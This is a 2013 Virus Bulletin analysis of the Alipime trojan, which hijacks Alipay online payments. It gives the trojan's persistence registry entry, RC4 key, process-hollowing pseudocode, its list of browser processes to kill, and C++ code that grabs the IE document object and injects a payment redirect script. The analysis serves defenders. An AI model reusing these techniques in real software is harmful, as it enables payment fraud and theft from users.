@@ -1,0 +1,145 @@
+Alipime makes a comeback with Fujacks.CB
+2013-07-01
+
+Ke Zhang
+Baidu
+,
+China
+Editor:
+Helen
+
+Martin
+Abstract
+The Alipime trojan was very active in China in 2011, before vanishing for a period of time, but recently a new Alipime threat has been discovered, being shipped with the W32.Fujacks.CB worm. Ke Zhang takes a look at the trojan that monitors web browsing and hijacks online payments.
+Copyright © 2013 Virus Bulletin
+
+Alipime [1] is a trojan that monitors web browsing and hijacks online payments by redirecting the user to fake payment pages on certain shopping sites. It was very active in China in 2011, before vanishing for a period of time.
+Recently, however, we captured an Alipime threat which was shipped with the W32.Fujacks.CB worm [2], and which utilized a legitimate program to load itself.
+Figure 1. Threat files overview.
+
+Installation
+In order to disguise itself as a legitimate application, Alipime copies itself to the following locations:
+C:\Program Files\ksupdate\360se.exe [Renamed CalendarMain.exe]
+C:\Program Files\ksupdate\sqlite3.dll [Malicious loader]
+C:\Program Files\ksupdate\Resloader.dll [Clean file]
+C:\Program Files\ksupdate\SkinBase.dll [Clean file]
+It then creates the following registry entry to make itself persistent on the compromised machine:
+[HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]
+“Run”=”C:\\Program Files\\ksupdate\\360se.exe”
+
+Decryption and injection
+The loader uses the RC4 algorithm with the key ‘1*98$3&^’ to decrypt the encrypted Alipime module.
+After decryption, the loader will drop a clean file, abc.exe (Microsoft Driver Verifier Manager), and launch it as a puppet, then inject the freshly decrypted Alipime module into it to execute. The loader makes use of the ‘process replacement’ trick to implement the injection, as the following pseudo code demonstrates:
+CreateProcess(...,”abc.exe”,...,CREATE_SUSPEND,...);
+GetThreadContext();
+ZwUnmapViewOfSection(...);
+VirtualAllocEx(...,ImageBase,SizeOfImage,...);
+WriteProcessMemory(...,headers,...);
+for (i=0; i < NumberOfSections; i++) {
+WriteProcessMemory(...,section,...);
+}
+SetThreadContext();
+ResumeThread();
+
+Figure 2. The loader is about to initialize the Array S.
+Figure 3. Partially decrypted data.
+
+Internet Explorer is desired
+Alipime forces the victim to use Internet Explorer (IE) by eliminating the following processes belonging to other popular web browsers:
+sogouexplorer.exe
+Firefox.exe
+twchrome.exe
+chrome.exe
+maxthon.exe
+miser.exe
+AliimSafe.exe
+alisafe.exe
+taobrowser.exe
+360chrome.exe
+QQBrowser.exe
+TTraveler.exe
+theworld.exe
+liebao.exe
+115br.exe
+baidubrowser.exe
+ruiying.exe
+ETwoOne.exe
+theWorld.exe
+COrAl.exe
+top.exe
+It needs to obtain the interface pointer of IHTMLDocument2 prior to monitoring and manipulating the pages viewed by the user.
+First, it enumerates all the windows and their child windows to find one named ‘Internet Explorer_Server’ (only Internet Explorer and IE-based browsers have this child window, which is why IE is targeted).
+Then it registers the special Windows message WM_HTML_GETOBJECT and sends it to the target window to retrieve the IHTMLDocument2 interface pointer. The sample code is as follows:
+//parameter hwnd = handle of the child window
+//Internet Explorer_Server
+//I did not put any error check in this code snippet,
+//but I have tested it.
+void GetDocInterface(HWND hwnd)
+{
+HINSTANCE hInstance = NULL;
+CComPtr<IHTMLDocument2> spDoc = NULL;
+LRESULT lRes;
+UINT uMsg;
+LPFNOBJECTFROMLRESULT pfnObjectFromLresult;
+CoInitialize(NULL);
+hInstance = LoadLibraryW(L”OLEACC.dll”);
+uMsg = RegisterWindowMessageW(L”WM_HTML_GETOBJECT”);
+SendMessageTimeout(hwnd,uMsg,0L,0L,SMTO_ABORTIFHUNG,1000,(DWORD*)&lRes);
+pfnObjectFromLresult = (LPFNOBJECTFROMLRESULT)GetProcAddress(
+hInstance,”ObjectFromLresult”);
+(*pfnObjectFromLresult)(lRes,IID_IHTMLDocument2,0,(void**)&spDoc);
+FreeLibrary(hInstance);
+CoUninitialize();
+}
+
+Payment hijacking
+Alipime monitors web browsing by calling the method IHTMLDocument2->get_URL. If it finds that the victim is browsing a fast payment page, it will redirect the browser to a standard payment page.
+IHTMLWindow2 *spWindow2 = NULL;
+VARIANT varRet = {0};
+BSTR myscript;
+BSTR scripttype;
+BSTR current_url;
+char *urlbuffer;
+spDoc->get_URL(&current_url);
+urlbuffer = _com_util::ConvertBSTRToString(current_url);
+SysFreeString(current_url);
+if (urlbuffer != NULL)
+{
+if (strstr(urlbuffer,”standard/fastpay/fastPayCashier.htm”) != 0)
+{
+spDoc->get_parentWindow(&spWindow2);
+if (spWindow2 != NULL)
+{
+//the order_ID is dynamically generated, a
+//typical id is as follows
+//0524741b62f306b421removed_deliberately
+myscript = _com_util::ConvertStringToBSTR(“document.write(“<script>window.location.href=\”https://cashier.alipay.com/
+standard/fastpay/paymentSwitch.htm?orderId=DynamicllyGenerated&target=standardPayCashier\””)”);
+scripttype = _com_util::ConvertStringToBSTR(“javascript”);
+VariantInit(&varRet);
+spWindow2->execScript(myscript,scripttype,&varRet);
+SysFreeString(myscript);
+SysFreeString(scripttype);
+VariantClear(&varRet);
+spWindow2->Release();
+
+}
+}
+}
+
+It then replaces the div section ‘J tabcnt accountDetail’ of the standard payment page to prevent the victim from accessing his Alipay (a Chinese online payment service) account balance – see Figure 4, Figure 5 and Figure 6.
+Figure 4. Original div section ‘J-tabcnt-accountDetail’ in the standard payment page.
+Figure 5. Alipime is about to replace the ‘J tabcnt accountDetail’ div section.
+Figure 6. Victim’s Alipay account balance becomes unavailable.
+If it finds that the victim is logging into an online bank to pay for his purchase(s), Alipime will execute a script which uses an embedded account to buy items of equal value on predetermined third-party websites, and replaces the final payment page so that the victim (unknowingly) pays for the attacker’s purchases.
+In the meantime, Alipime redirects the payment page to ‘http://img.alipay.com/img/icon/icon_tdwaiting.gif’ to fool the victim into thinking that the unusual time lapse is nothing to worry about (Figure 7).
+Figure 7. Alipime uses the ‘waiting’ GIF from Alipay to deceive the victim.
+Alipime also prevents the victim from reviewing his purchase(s) – in this instance by redirecting page ‘http://trade.taobao.com/trade/itemlist/list_bought_items.htm’ to ‘http://trade.taobao.com/trade/confirm_goods.htm?biz_order_id=’ so that he cannot find out if he has paid for his purchase(s) successfully (see Figure 8).
+Figure 8. The victim is unable to view his purchase(s).
+
+Conclusion
+Alipime makes off with victims’ money, but without causing any damage to the infected system – it is a challenge for anti-virus engines to detect and defend against it.
+
+Bibliography
+[1] Trojan.Alipime. http://www.symantec.com/security_response/writeup.jsp?docid=2011-012506-3430-99.
+[2] W32.Fujacks.CB. http://www.symantec.com/security_response/writeup.jsp?docid=2009-072015-2415-99.
